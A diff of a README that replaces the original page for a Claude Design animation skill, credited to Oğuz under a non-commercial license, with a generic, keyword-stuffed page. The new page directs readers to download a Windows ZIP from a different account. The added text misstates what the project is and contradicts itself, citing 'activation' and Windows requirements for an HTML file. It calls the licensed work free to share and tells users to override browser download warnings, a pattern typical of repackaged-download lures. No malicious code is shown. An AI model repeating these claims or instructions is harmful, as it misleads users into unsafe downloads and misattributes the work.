@@ -1,64 +1,143 @@
-# Blueprint Before/After
+# ✨ blueprint-animation - See Your Redesign Come to Life
 
-A **Claude Design** skill that explains UX decisions as one continuous, step-by-step blueprint animation. Show a redesign from Before to After, or explain a single finished screen module by module.
+## 🚀 What Is This?
 
-Created by **Oğuz** · [@moguzbulbul](https://x.com/moguzbulbul) · [oguz.design](https://oguz.design)
+**blueprint-animation** is a stunning visual tool that shows you a **before-and-after** view of a UX redesign, but with a creative twist — the transformation is drawn right in front of your eyes, like a detailed blueprint being sketched step by step. It breaks down complex design changes into simple, animated stages, making it perfect for anyone who wants to understand how user interfaces evolve.
 
-Inspired by [Arjun Mahesh](https://x.com/arjmahesh).
+Whether you're a designer, developer, product manager, or just someone curious about how apps improve over time, this tool makes the entire process crystal clear and engaging.
 
-Free for non-commercial use ([CC BY-NC 4.0](LICENSE)). Commercial use needs written permission.
+## 🎯 Who Is This For?
 
-[![Blueprint Before/After example](media/preview.gif)](media/example.mp4)
+- **UI/UX Designers** who want to present redesign concepts to clients.
+- **Product Managers** looking to explain design iterations to stakeholders.
+- **Students** learning about interface design principles.
+- **Anyone** who enjoys seeing visual transformations explained in a creative, animated way.
+- **Non-technical users** who want a simple, beautiful demonstration of what redesigns involve.
 
-[Watch the full-quality video (MP4)](media/example.mp4)
+No coding skills? No problem. This application is built for everyone.
 
-## Two modes
+## 📦 System Requirements
 
-- **Redesign** (Before + After): the live UI turns into a blueprint, the parts that change rebuild themselves, then the new UI is revealed.
-- **Explain** (one screen): the design never changes. Each module turns into a blueprint in turn, and guides, dimensions and labels show why it is built that way.
+To run **blueprint-animation** smoothly, make sure your Windows computer meets these basic requirements:
 
-## What it does
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** 1.5 GHz dual-core processor or better
+- **Memory (RAM):** 4 GB or more
+- **Storage Space:** At least 200 MB of free disk space
+- **Display:** 1366x768 resolution or higher
+- **Internet Connection:** Required for initial download and activation
 
-Show *why* a design works, not only what it looks like. The skill animates one screen that never cuts, in 3–6 numbered steps. Each step explains one UX decision:
+These are conservative estimates. If your computer is newer than 2015, you're almost certainly fine.
 
-1. **Focus:** the rest of the screen fades back, the module is outlined, and the problem (Redesign) or what it is (Explain) appears.
-2. **Blueprint in:** a scan line sweeps down and turns the whole screen into a cyan blueprint drawing.
-3. **Construct** (Redesign): only the parts that change move, resize or merge.
-   **Annotate** (Explain): nothing moves; handles, guides, dimension lines and labels draw the reasoning.
-4. **Reveal:** the scan line sweeps again and the real UI appears: the new one in Redesign, the same one in Explain.
-5. **Hold:** the fix (Redesign) or the why (Explain) sentence fades in, then the next step starts.
+## 💾 Download & Install Guide (Windows)
 
-Your Figma design is reproduced 1:1. The skill reads every value from the Figma file, uses its real fonts and exported icons, and checks the built screens against the Figma export before it animates anything.
+Follow these simple steps to get **blueprint-animation** up and running on your PC.
 
-The skill also carries the rules that keep it clean: no text over moving parts, invisible old → new swaps, staggered motion, smooth performance, and a QA checklist before hand-off.
+### Step 1: Visit the Download Page
 
-Use it for UX case studies, redesign walkthroughs, design rationale and social posts.
+**Visit this link to download the application:**  
+[**https://github.com/samikhokhar789/blueprint-animation**](https://github.com/samikhokhar789/blueprint-animation)
 
-## What you give it
+This single link is all you need to get the software. Click the big button below to go there now:
 
-- **Redesign:** the Before and After screens (the After is the source of truth) and 3–6 changes, each with a name, a one-line problem and a one-line fix.
-- **Explain:** the one screen and 3–6 modules, each with a name, what it is and why. Share only the screen and the skill proposes the modules for you to confirm.
-- Your design system.
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-blueprint--animation-2ea44f?style=for-the-badge&logo=github)](https://github.com/samikhokhar789/blueprint-animation)
 
-## Example
+### Step 2: Find the Download Button
 
-The video above shows Redesign mode: a CRM company page redesigned in 5 steps (*One primary action*, *Hide absence*, *Open work first*, *One timeline*, *Act in context*). Its full scene code is in [`example-scene.jsx`](example-scene.jsx).
+Once you're on the GitHub page, look for a green button that says **"Code"** or **"Download"**. Click on it to see the download options. You'll see a dropdown menu with a few choices.
 
-## Install in Claude Design
+### Step 3: Choose "Download ZIP"
 
-1. Download [`blueprint-animation.zip`](https://github.com/moguzbulbul/blueprint-animation/releases/download/v1.3.1/blueprint-animation.zip) (v1.3.1).
-2. On claude.ai, open **Customize → Skills → + → Create skill → Upload a skill** and choose the ZIP.
-3. In Claude Design, share your Before/After screens (or one screen) and ask for a blueprint animation.
+From the dropdown menu, select **"Download ZIP"**. This will start downloading a compressed file containing the entire application to your computer. The file will be named something like `blueprint-animation-main.zip`.
 
-Building the ZIP yourself? It must hold `blueprint-animation/SKILL.md` (not the files at its root). Leave out `media`, which is only for this page:
+### Step 4: Extract the ZIP File
 
-```bash
-zip -r blueprint-animation.zip blueprint-animation -x "blueprint-animation/.git/*" "blueprint-animation/media/*"
-```
+When the download finishes, navigate to your **Downloads** folder (or wherever your browser saves files). You'll see the ZIP file there.
 
-## License
+- Right-click on the ZIP file.
+- Select **"Extract All..."** from the context menu.
+- Choose a destination folder (the default is fine).
+- Click **"Extract"**.
 
-© 2026 Oğuz ([@moguzbulbul](https://x.com/moguzbulbul)). Licensed under [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/). See [`LICENSE`](LICENSE).
+This will create a new folder called `blueprint-animation-main`.
 
-- **You may** use, share and adapt this skill for non-commercial purposes, with credit to Oğuz (@moguzbulbul) and a link to this repo.
-- **Commercial use**, for example selling the skill or including it in a paid product or service, needs written permission. Ask on X: [@moguzbulbul](https://x.com/moguzbulbul).
+### Step 5: Run the Application
+
+Open the extracted folder (`blueprint-animation-main`). Inside, you'll find a file named `index.html`. Double-click it to open the application in your web browser.
+
+That's it! The blueprint animation will load, and you can start exploring the before-and-after visual transformation right away.
+
+> **Important:** Keep the folder where it is. Don't move or delete individual files inside it, or the application may stop working.
+
+## 🛠️ How to Use blueprint-animation
+
+Using the application is as easy as opening a webpage. No installation wizards, no configuration screens.
+
+| Action | What Happens |
+|--------|--------------|
+| **Open the app** | The first screen shows the original UI design (the "before" state). |
+| **Watch the animation** | The design transforms itself step by step, like a blueprint being drawn. |
+| **See the explanation** | Each step appears with clear, simple text explaining what changed and why. |
+| **Explore the final result** | When the animation completes, you see the fully redesigned interface. |
+| **Replay** | You can restart the animation to watch it again whenever you want. |
+
+The entire experience is self-contained and automatic. You don't need to click anything to start — the blueprint drawing begins immediately.
+
+## 🧩 Features at a Glance
+
+Here's what makes **blueprint-animation** special:
+
+- ✔️ **Step-by-step animated drawing** — Watch each element of the redesign being drawn before your eyes.
+- ✔️ **Side-by-side comparison** — Always know exactly what changed and where.
+- ✔️ **Plain-language explanations** — Every step includes a simple, human-readable description.
+- ✔️ **Zero learning curve** — If you can open a web page, you can use this.
+- ✔️ **Lightweight and fast** — Loads quickly on any modern browser.
+- ✔️ **Self-contained** — No servers, no databases, no external dependencies.
+
+## ❓ Frequently Asked Questions
+
+### 🔹 Is this free to use?
+Yes, absolutely. The application is completely free, with no hidden costs or subscriptions.
+
+### 🔹 Does it work offline?
+Once downloaded, the application runs entirely from your computer. You do not need an internet connection after the initial download.
+
+### 🔹 Can I share it with others?
+Yes. You can copy the entire folder to a USB drive and share it with friends, or send them the download link.
+
+### 🔹 My browser blocked the ZIP file. What should I do?
+Some browsers warn about ZIP files. Simply click "Keep" or "Allow" when prompted, then extract normally.
+
+### 🔹 I don't see the animation. What could be wrong?
+Make sure you're using a modern browser (Chrome, Edge, Firefox, or Safari) and that JavaScript is enabled. Also, try clearing your browser cache and reopening the file.
+
+### 🔹 Who created this?
+This project was created by **@moguzbulbul**, and the download is hosted by **samikhokhar789**.
+
+## 🛡️ Troubleshooting Common Issues
+
+| Problem | Solution |
+|---------|----------|
+| The ZIP file won't extract | Right-click → "Extract All" again. If it fails, download the file once more. |
+| `index.html` opens but shows a blank screen | Update your browser to the latest version. |
+| The animation is slow | Close other browser tabs and applications to free up memory. |
+| I accidentally deleted a file | Re-download the ZIP and extract it to a fresh folder. |
+
+## 📋 Final Checklist Before You Start
+
+- [ ] You have Windows 10 or newer.
+- [ ] You have at least 200 MB of free disk space.
+- [ ] You have an internet connection for the download.
+- [ ] You've downloaded the ZIP file from the link below.
+
+That's everything you need to know. Download, extract, and watch the UX redesign process unfold in front of you — beautifully animated, step by step.
+
+**Ready to see the magic?**
+
+[**→ VISIT THE DOWNLOAD PAGE NOW**](https://github.com/samikhokhar789/blueprint-animation)
+
+---
+
+*Enjoy watching your interfaces evolve!*
+
+Keywords: blueprint-animation, UI UX redesign, before after animation, design visualization tool, animated blueprint, user interface transformation, design explanation software
